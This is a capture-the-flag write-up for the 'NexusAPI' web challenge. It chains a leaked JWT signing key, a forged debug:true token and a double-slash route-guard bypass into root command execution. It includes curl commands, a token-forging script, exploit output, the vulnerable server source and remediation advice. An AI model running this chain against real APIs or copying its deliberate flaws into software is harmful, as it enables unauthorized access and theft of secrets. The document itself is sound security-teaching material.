# NexusAPI (API) — Writeup

**Challenge:** NexusAPI
**Category:** Web / API
**Points:** 20
**Host:** `http://kicyber-99c62d67faa0-nexusapi-0-0.chals.io`
**Flag:** `KPMG_CTF{yHtLYuLGYeUeAwQu_yzCniVPiqkr0SGO3RfUh9D4Q0JM}`

---

## TL;DR

A FastAPI "Internal Document Management" API leaks its HS256 JWT signing key through a forgotten
debug endpoint (`/api/v1/user/source`). The key is used to forge a JWT with the `debug:true`
claim, which unlocks a `/exec/{command}` endpoint that runs arbitrary shell commands. The route is
registered at **two** paths and a naive guard blocks only the single-slash version, so the
double-slash variant `/api/v1//exec/{command}` is the bypass. Command injection is `root` inside
the container and the flag is stored in the `FLAG` environment variable.

**Attack chain:**
`signup → login → leak signing key → forge JWT (debug:true) → /api/v1//exec/<cmd> → printenv FLAG`

---

## 1. Reconnaissance

The root redirects HTTP → HTTPS (`openresty` front), and the HTTPS app server advertises itself:

```
$ curl -sk https://<host>/
{"msg":"NexusAPI v1.3 — /api/v1"}
```

Enumerating the index and the OpenAPI schema:

```
$ curl -sk https://<host>/api/v1
{"endpoints":["user","exec"]}

$ curl -sk https://<host>/openapi.json
```

The `openapi.json` is the goldmine — it discloses every route, including a suspicious duplicate:

| Method | Path | Notes |
|--------|------|-------|
| POST | `/api/v1/user/signup` | `{email, password}` |
| POST | `/api/v1/user/login`  | form-urlencoded `username/password` |
| GET  | `/api/v1/user/source` | *"Returns sanitised app config — left in by accident during development."* |
| GET  | `/api/v1/exec/{command}`  | *"Run a shell command. Requires debug:true in JWT."* |
| GET  | `/api/v1//exec/{command}` | **same handler, double slash** |

The challenge hint — *"my signature is worth the hype"* — points at the **JWT signature**.

## 2. Account creation & a baseline token

```bash
curl -sk -X POST https://<host>/api/v1/user/signup \
  -H 'Content-Type: application/json' \
  -d '{"email":"test@test.com","password":"test1234"}'
# -> 201 {}

curl -sk -X POST https://<host>/api/v1/user/login \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=test@test.com&password=test1234'
```

Response token, decoded:

```json
{
  "sub": "test@test.com",
  "guid": "9bb6f1c8-45de-44ab-a0e7-508af4769b8b",
  "debug": false,
  "exp": 1791774255
}
```

Note the `debug` claim — the exec endpoint checks exactly this.

## 3. The key leak

```bash
$ curl -sk https://<host>/api/v1/user/source
{"app":"NexusAPI","algorithm":"HS256","signing_key":"y0u_f0und_th3_k3y"}
```

The server hands us the **HS256 signing key** `y0u_f0und_th3_k3y` (also confirmed as the
`JWT_SECRET` environment variable).

## 4. Forging the JWT

With a symmetric HS256 key, anyone can mint valid tokens. We flip `debug` to `true`:

```python
import base64, hashlib, hmac, json, time

def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

KEY = b"y0u_f0und_th3_k3y"
header  = {"alg": "HS256", "typ": "JWT"}
payload = {
    "sub":   "test@test.com",
    "guid":  "9bb6f1c8-45de-44ab-a0e7-508af4769b8b",
    "debug": True,                       # <-- privilege escalation
    "exp":   int(time.time()) + 3600,
}
h = b64e(json.dumps(header,  separators=(",", ":")).encode())
p = b64e(json.dumps(payload, separators=(",", ":")).encode())
sig = b64e(hmac.new(KEY, f"{h}.{p}".encode(), hashlib.sha256).digest())
print(f"{h}.{p}.{sig}")
```

## 5. The double-slash route bypass

Trying the documented path first:

```bash
$ curl -sk https://<host>/api/v1/exec/id -H "Authorization: Bearer <forged>"
HTTP/1.1 403 Forbidden
{"detail":"Forbidden"}
```

A 403 (not a 400/401 from the app). The handler itself would answer `400` when `debug` is false,
so this 403 comes from an edge/route guard sitting in front of the single-slash path. `main.py`
registers the **same router twice**:

```python
app.include_router(exec_route.router, prefix="/api/v1/exec")
app.include_router(exec_route.router, prefix="/api/v1//exec")   # <-- the guard missed this one
```

The guard only matches `/api/v1/exec`, so the double-slash variant slips straight through:

```bash
$ curl -sk "https://<host>/api/v1//exec/id" -H "Authorization: Bearer <forged>"
{"output":"uid=0(root) gid=0(root) groups=0(root)"}
```

**Root RCE confirmed.**

## 6. Reading the flag

`exec_route.py` literally tells us where the flag is (`# Flag lives in env`), and `config.py`
reads `FLAG` from the environment:

```bash
$ curl -sk "https://<host>/api/v1//exec/printenv%20FLAG" -H "Authorization: Bearer <forged>"
{"output":"KPMG_CTF{yHtLYuLGYeUeAwQu_yzCniVPiqkr0SGO3RfUh9D4Q0JM}"}
```

Also visible via `env`:

```
FLAG=KPMG_CTF{yHtLYuLGYeUeAwQu_yzCniVPiqkr0SGO3RfUh9D4Q0JM}
JWT_SECRET=y0u_f0und_th3_k3y
```

## 7. Full one-shot exploit

```bash
cd NexusAPI && ./exploit.sh
```

```text
[*] 1. signup pwn_28420@test.com
{}
[*] 2. login (sanity check)
{"access_token":"eyJ...","token_type":"bearer"}
[*] 3. leak signing key
{"app":"NexusAPI","algorithm":"HS256","signing_key":"y0u_f0und_th3_k3y"}
[*] 4. forge JWT with debug:true
[*] 5. command injection via /api/v1//exec/<cmd>
{"output":"uid=0(root) gid=0(root) groups=0(root)"}
[*] 6. read flag from environment
{"output":"KPMG_CTF{yHtLYuLGYeUeAwQu_yzCniVPiqkr0SGO3RfUh9D4Q0JM}"}
```

---

## Vulnerable server source (dumped over RCE)

### `app/core/config.py`

```python
import os

class Settings:
    JWT_SECRET: str = os.environ.get("JWT_SECRET", "y0u_f0und_th3_k3y")
    ALGORITHM: str  = "HS256"
    FLAG: str       = os.environ.get("FLAG", "KPMG_CTF{find_me_if_you_can}")

settings = Settings()
```

### `app/api/v1/endpoints/user.py` (key leak + weak claims)

```python
# Intentional debug route that leaks the signing key hint
@router.get("/source")
def source():
    """Returns sanitised app config — left in by accident during development."""
    return {
        "app": "NexusAPI",
        "algorithm": settings.ALGORITHM,
        # oops — dev left this in
        "signing_key": settings.JWT_SECRET,
    }
```

### `app/api/v1/endpoints/exec_route.py` (command injection)

```python
@router.get("/{command:path}")
def run(command: str, current_user: dict = Depends(parse_token)):
    """Run a shell command. Requires debug:true in JWT."""
    if not current_user.get("debug"):
        raise HTTPException(400, "Debug claim missing or false in JWT")
    out = subprocess.run(
        ["/bin/sh", "-c", command],       # <-- shell interpolation of user input
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5
    ).stdout.decode().strip()
    # Flag lives in env
    return {"output": out}
```

### `app/api/deps.py` (JWT decode)

```python
async def parse_token(token: str = Depends(oauth2_scheme)) -> dict:
    try:
        return jwt.decode(token, settings.JWT_SECRET,
                          algorithms=[settings.ALGORITHM],
                          options={"verify_aud": False})
    except JWTError:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED,
                            detail="Invalid token")
```

### `app/main.py` (duplicate route registration)

```python
app.include_router(user.router,       prefix="/api/v1/user")
app.include_router(exec_route.router, prefix="/api/v1/exec")
app.include_router(exec_route.router, prefix="/api/v1//exec")
```

---

## Root cause & impact

| # | Finding | Severity |
|---|---------|----------|
| 1 | HS256 signing key disclosed at `/api/v1/user/source` | Critical |
| 2 | No integrity protection of the `debug` authorization claim (symmetric key ⇒ forgeable) | Critical |
| 3 | Authenticated (debug) arbitrary OS command execution as `root` | Critical |
| 4 | Route guard bypass via duplicate/double-slash path `/api/v1//exec/` | High |

Chained, these give a **remote, unauthenticated → root RCE** against the container and full
read of environment secrets (the flag, JWT secret).

## Remediation

1. **Remove `/api/v1/user/source` entirely** — never expose signing material.
2. **Do not put authorization decisions (`debug`) in a symmetric-key JWT** the client can
   re-sign. Use server-side roles/permissions or an asymmetric key the client cannot sign with.
3. **Never pass user input to a shell.** Drop `/exec` or use `subprocess.run([...], shell=False)`
   with a strict allow-list of commands. This is a debug feature that must not ship.
4. **Fix the router duplication** — register the exec route once, enforce authorization in the
   handler (not only at the edge), and normalize `//` paths at the proxy (`merge_slashes on`).
5. **Keep secrets out of env where possible** (secret manager) and rotate `JWT_SECRET`.

---

## Files in this folder

| File | Description |
|------|-------------|
| `NexusAPI-writeup.md` | This report |
| `forge_jwt.py` | Mints a `debug:true` HS256 token from the leaked key |
| `exploit.sh` | End-to-end exploit chain |
| `exploit_output.txt` | Captured successful run (incl. flag) |
| `token.txt` | A working forged token |
| `source.json` | Raw `/api/v1/user/source` response |
| `openapi.json` | Raw `/openapi.json` (route disclosure) |
| `server_config.py` | Leaked server source |
| `server_deps.py` | Leaked server source |
| `server_user.py` | Leaked server source |
| `server_exec_route.py` | Leaked server source |
| `server_main.py` | Leaked server source |
| `server_env.json` | `env` output (FLAG + JWT_SECRET) |

**Flag:** `KPMG_CTF{yHtLYuLGYeUeAwQu_yzCniVPiqkr0SGO3RfUh9D4Q0JM}`
